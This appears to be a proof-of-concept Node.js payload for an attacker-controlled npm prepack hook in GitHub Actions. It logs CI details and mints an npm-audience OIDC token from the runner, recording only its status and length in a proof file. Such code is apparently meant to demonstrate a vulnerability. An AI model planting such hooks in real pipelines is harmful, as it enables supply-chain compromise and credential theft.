const fs = require('fs');
const out = [];
out.push('RCE_MARKER: attacker-controlled prepack executed');
out.push('actor=' + (process.env.GITHUB_ACTOR || ''));
out.push('workflow_ref=' + (process.env.GITHUB_WORKFLOW_REF || ''));
out.push('REF=' + (process.env.REF || ''));
out.push('ID_TOKEN_URL_SET=' + (!!process.env.ACTIONS_ID_TOKEN_REQUEST_URL));
(async () => {
  const u = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (u && t) {
    try {
      const r = await fetch(u + '&audience=npm:registry.npmjs.org', { headers: { authorization: 'Bearer ' + t } });
      const body = await r.text();
      out.push('oidc_http_status=' + r.status);
      try {
        const j = JSON.parse(body);
        out.push('oidc_token_minted_len=' + String(j.value || '').length);
      } catch (e) { out.push('oidc_body_prefix=' + body.slice(0, 60)); }
    } catch (e) { out.push('oidc_error=' + e.message); }
  }
  const s = out.join('\n');
  console.log(s);
  try { fs.writeFileSync('/tmp/rce-proof.txt', s + '\n'); } catch (e) { console.log('write failed ' + e.message); }
})();
